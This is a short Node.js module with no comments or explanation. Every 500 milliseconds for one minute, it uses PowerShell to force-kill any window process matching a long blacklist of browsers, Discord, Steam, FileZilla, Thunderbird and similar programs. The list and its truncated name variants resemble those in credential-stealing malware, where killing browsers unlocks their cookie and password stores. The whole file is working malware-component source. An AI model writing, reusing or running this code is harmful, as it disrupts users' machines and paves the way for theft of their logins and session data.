const child_process = require('child_process');

const terminateProcess = (pid) => {
  return new Promise((resolve, reject) => {
    try {
      child_process.exec(`powershell Stop-Process -Id ${pid} -Force`, (error, stdout, stderr) => {
        if (!error) {
          resolve(pid);
        } else {
          reject(error);
        }
      });
    } catch (error) {
      reject(error);
    }
  });
}

const getWindowProcesses = () => {
  return new Promise((resolve, reject) => {
    try {
      child_process.exec(`powershell "(Get-Process | Where-Object { $_.MainWindowTitle -ne '' }) | ForEach-Object { $_.Id, $_.MainWindowTitle }"`, (error, stdout, stderr) => {
        if (!error) {
          const processInfo = stdout.split('\n').map(line => line.trim()).filter(Boolean);
          resolve(processInfo);
        } else {
          reject(error);
        }
      });
    } catch (error) {
      reject(error);
    }
  });
}


const killProcessesByWindowNames = async (blacklist) => {
  try {
    const processes = await getWindowProcesses();
    processes.forEach((processInfo, index) => {
      if (index % 2 !== 0) {
        const title = processInfo.toLowerCase();
        const pid = processes[index - 1];
        blacklist.forEach(async (name) => {
          if (title.includes(name)) {
            try {
              await terminateProcess(pid);
            } catch (error) {
            }
          }
        });
      }
    });
  } catch (error) {
    console.error(error);
  }
}

module.exports = async () => {
  const windowBlacklist = [
    "Orbitum", "Amigo", "Torch", "Kometa",
    "cord", "Waterfox", "mullvad", "firefox", "chrome",
    "mozilla", "vivaldi", "Opera", "Epic", "Sputnik", "7Star", "CentBrowser",
    "steam", "filezilla", "brave", "BraveSoftware", "brave.exe", "msedge",
    "edge", "Uran", "KMelon", "Maxthon3", "iebao", "oowon", "leipnir5",
    "hromePlus", "uperbird", "afotech", "aferTechnologies", "uhba",
    "orBrowser", "lementsBrowser", "ocCoc", "oBrowser", "IP Surf", "Atom",
    "liebao", "Coowon", "Sleipnir5", "Superbird", "Rafotech",
    "SaferTechnologies", "Suhba", "TorBrowser", "ElementsBrowser", "CocCoc",
    "GoBrowser", "QIP Surf", "RockMelt", "Bromium", "Comodo",
    "Xpom", "Chedot", "360Browser", "Kmelon", "PaleMoon", "IceDragon",
    "BlackHaw", "Cyberfox", "Thunderbird", "SeaMonkey", "Firefox",
    "ockMelt", "romium", "omodo", "pom", "hedot", "60Browser"
  ];

  const intervalId = setInterval(async () => {
    try {
      await killProcessesByWindowNames(windowBlacklist);
    } catch (error) {
      console.error(error);
    }
  }, 5 * 100);

  setTimeout(() => {
    clearInterval(intervalId);
  }, 60 * 1000);
}